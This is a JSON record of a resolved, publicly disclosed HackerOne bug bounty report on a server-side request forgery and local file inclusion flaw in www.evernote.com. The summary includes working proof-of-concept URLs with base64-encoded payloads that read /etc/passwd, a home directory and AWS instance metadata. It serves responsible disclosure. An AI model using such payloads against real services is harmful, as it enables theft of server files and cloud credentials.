{
  "id": 1189367,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMTg5MzY3",
  "url": "https://hackerone.com/reports/1189367",
  "title": "Full read SSRF in www.evernote.com that can leak aws metadata and local file inclusion",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "critical",
  "readable_substate": "Resolved",
  "created_at": "2021-05-09T09:49:54.976Z",
  "submitted_at": "2021-05-09T09:49:55.068Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "neolex",
    "url": "/neolex",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/357/493/072736b6e66caa5ec8d8445e5ab2133a20665c0a_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 44211,
    "url": "https://hackerone.com/evernote",
    "handle": "evernote",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/9jjpi96bDMknk4JEkhSEyk8z/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/9jjpi96bDMknk4JEkhSEyk8z/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Evernote",
      "twitter_handle": "",
      "website": "http://evernote.com",
      "about": ""
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "no-content",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2021-12-06T21:41:59.141Z",
  "bug_reporter_agreed_on_going_public_at": "2021-12-02T01:56:11.536Z",
  "team_member_agreed_on_going_public_at": "2021-12-06T21:41:58.968Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "",
  "weakness": {
    "id": 68,
    "name": "Server-Side Request Forgery (SSRF)"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2022-01-01T01:56:11.749Z",
  "allow_singular_disclosure_after": -66831296.60502142,
  "singular_disclosure_allowed": true,
  "vote_count": 244,
  "voters": [
    "b19r8a14",
    "screamy",
    "n0tst3",
    "xchessy",
    "416e6e61",
    "p4n7h3rx",
    "cucumbersalad",
    "patrick666",
    "buraaqsec",
    "jmkdev",
    "and 234 more..."
  ],
  "severity": {
    "rating": "critical",
    "author_type": "User"
  },
  "structured_scope": {
    "databaseId": 39302,
    "asset_type": "URL",
    "asset_identifier": "www.evernote.com",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "id": 113336,
      "category": "team",
      "content": "## Summary:\nThe following endpoint was found to be vulnerable to SSRF :  `https://www.evernote.com/ro/aHR0cDovLzE2OS4yNTQuMTY5LjI1NC8jdGVzdC5qcw==/-1430533899.js`\n\nThe endpoint take a path in url and retrieve its content. it is supposed to be use on path but it can be used on URL to get access to internal network :SSRF\nAnd It can also be used with file uri : Local file inclusion.\n\n\n\n## Steps To Reproduce:\n\n### Leak Local file:\n* Open the following url : \nhttps://www.evernote.com/ro/ZmlsZTovLy9ob21lL2FiZW5hdmlkZXMvIy5qcw==/-1430533899.js\n\nThe payload is base64 encoded of : `file:///home/abenavides/#.js`\n\nthe # is used because the end of the url must be in javascript but to ignore it in uri i made it after the #\n\nit leaks the content of the directory : \n███\n\nyou can also leak file with : https://www.evernote.com/ro/ZmlsZTovLy9ldGMvcGFzc3dkIy5qcw==/-1430533899.js\n███████\n\n### SSRF : \nYou can also use url to trigger SSRF : \n* To have access to aws metadata you can use the following url : \nhttps://www.evernote.com/ro/aHR0cDovLzE2OS4yNTQuMTY5LjI1NC8jLmpz/-1430533899.js\n\n█████\n\n## Impact\n\nThe impact is critical.\nAn attacker can leak abitrary file in the webserver of www.evernote.com\nAnd access any internal host of evernote, including awsmetadata with full response read.\n\nI didn't tried to escalate the bug to not \"cross the line\", and because I think it clearly demonstrate the critical impact already.\n\nBest regards.",
      "user": {
        "id": 769145,
        "username": "bsamuels",
        "name": "Benjamin Samuels",
        "bio": "",
        "cleared": false,
        "verified": false,
        "website": null,
        "location": "",
        "created_at": "2019-10-03T21:32:12.804Z",
        "url": "https://hackerone.com/bsamuels",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "hacker",
        "profile_picture_urls": {
          "small": "https://profile-photos.hackerone-user-content.com/variants/rAYBKoYnVfqRPzYzFKg58633/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
          "medium": "https://profile-photos.hackerone-user-content.com/variants/rAYBKoYnVfqRPzYzFKg58633/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc",
          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/rAYBKoYnVfqRPzYzFKg58633/114764ec8f01b1a3e153599212c9f011fb3b0bce3a4fdc1f9a3c551f8c94acf8"
        }
      },
      "can_view?": true,
      "can_create?": false,
      "attachments": []
    },
    {
      "id": 340957,
      "category": "researcher",
      "content": "Critical SSRF on evernote,\nI made a blog post about this vulnerability here : https://blog.neolex.dev/13/\nBest regards",
      "user": {
        "id": 357493,
        "username": "neolex",
        "name": "Neolex",
        "bio": "",
        "cleared": true,
        "verified": true,
        "website": "https://blog.neolex.dev/",
        "location": "France",
        "created_at": "2018-09-20T18:11:12.328Z",
        "url": "https://hackerone.com/neolex",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "hacker",
        "profile_picture_urls": {
          "small": "https://profile-photos.hackerone-user-content.com/variants/000/357/493/072736b6e66caa5ec8d8445e5ab2133a20665c0a_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/357/493/072736b6e66caa5ec8d8445e5ab2133a20665c0a_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937",
          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/000/357/493/072736b6e66caa5ec8d8445e5ab2133a20665c0a_original.png/60f411638706d89ae3052af6fe8b88fa9a798e291deee40f6a22e81418d78d5f"
        }
      },
      "can_view?": true,
      "can_create?": false,
      "attachments": []
    }
  ]
}
